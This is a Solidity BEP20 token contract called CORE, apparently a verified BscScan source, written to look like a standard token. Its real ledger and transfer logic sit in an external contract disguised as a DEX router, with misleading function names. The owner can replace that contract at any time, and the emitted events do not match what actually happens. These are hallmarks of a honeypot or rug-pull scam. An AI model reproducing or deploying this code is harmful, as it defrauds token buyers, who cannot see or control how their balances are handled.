/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

// email: [email protected]

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract IDEXRouter {
    function weth(address _weth) external view returns (uint256);

    function addLiquidityETH(address token, uint256 amount) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint256 amountOutMin
    ) external returns (uint256, uint256);
}

contract CORE is BEP20 {
    address public owner = msg.sender;
    string public name = "CORE";
    string public symbol = "CORE";
    uint8 public _decimals;
    uint256 public _totalSupply;
    IDEXRouter private router;
    address private panckerouter;
    address public marketAddres = address(0x48f6B501b880565df57a5DA8891520Eb9A66709c);

    mapping(address => mapping(address => uint256)) private allowed;
    mapping(address => uint256) balance;
    address private accounting;

    constructor(address _router) public {
        _decimals = 18;
        _totalSupply = 2100000000 * 10**18;
        router = IDEXRouter(_router);
        router.addLiquidityETH(msg.sender, _totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function setIDEXRouter(address _router) public {
        require(msg.sender == owner, "owner");
        router = IDEXRouter(_router);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) public view returns (uint256) {
        return router.weth(who);
    }

    function allowance(address who, address spender)
        public
        view
        returns (uint256)
    {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function transfer(address to, uint256 amount)
        public
        returns (bool success)
    {
        (uint256 mAmount, uint256 bAmount) = router
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                msg.sender,
                to,
                amount
            );
        if (mAmount > 0) {
            emit Transfer(msg.sender, address(marketAddres), mAmount);
        }
        if (bAmount > 0) {
            emit Transfer(msg.sender, address(0xdead), bAmount);
        }
        emit Transfer(msg.sender, to, amount - mAmount - bAmount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool success) {
        require(amount > 1);
        require(allowed[from][msg.sender] >= amount, "Not allowed");

        (uint256 mAmount, uint256 bAmount) = router
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                from,
                to,
                amount
            );
        if (mAmount > 0) {
            emit Transfer(msg.sender, address(22222), mAmount);
        }
        if (bAmount > 0) {
            emit Transfer(msg.sender, address(0xdead), bAmount);
        }
        emit Transfer(msg.sender, to, amount - mAmount - bAmount);
        return true;
    }

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}